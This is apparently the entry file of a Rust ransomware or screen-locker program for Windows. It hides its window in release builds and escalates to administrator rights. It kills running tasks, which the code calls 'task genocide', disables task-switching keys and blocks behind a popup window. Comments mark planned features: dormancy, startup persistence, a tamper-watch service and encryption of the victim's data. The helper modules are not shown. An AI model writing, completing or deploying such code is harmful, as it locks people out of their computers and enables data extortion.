#![cfg_attr(feature = "release", windows_subsystem = "windows")]
#![feature(atomic_mut_ptr)]
#![feature(is_some_and)]

mod common;
mod elevate;
mod keyboard;
mod log;
mod tasks;
mod window;

fn main() {
    // TODO: lay dormant for unspecified amount of time

    // If not running as admin, escalate privileges
    elevate::ensure_elevated();

    // TODO: install self into startup

    // TODO: register service to watch for tampering with main executable

    // TODO: Spawn threads to encrypt data

    take_over_shell();
}

fn take_over_shell() {
    // Take over keyboard and disallow taskmgr
    tasks::begin_task_genocide();
    keyboard::disable_task_keys();

    // Blocks the main thread with the window message loop
    window::create_popup_window();

    // Cleanup (assuming graceful exit)
    keyboard::enable_task_keys();
    tasks::stop_task_genocide();
}
